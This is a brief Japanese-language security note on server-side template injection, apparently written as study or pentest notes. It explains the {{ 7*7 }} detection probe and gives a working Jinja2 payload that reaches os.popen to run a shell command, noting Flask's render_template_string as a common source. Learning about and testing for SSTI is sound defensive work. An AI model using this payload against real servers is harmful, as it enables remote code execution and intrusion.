# Server-Side Template Injection (SSTI)
テンプレートエンジン(Jinja2, Twigなど)にユーザ入力が直接渡るとテンプレート構文でコード実行が可能

## 実践例: Jinja2 SSTI
```python
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

## よくある形式

- {{ 7*7 }} -> 49が返ってくるかどうかでSSTI判定する
- Pythonオブジェクトチェーンでos.popenに到達
- Flaskアプリで'render_template_string()'が使われているケースが多い
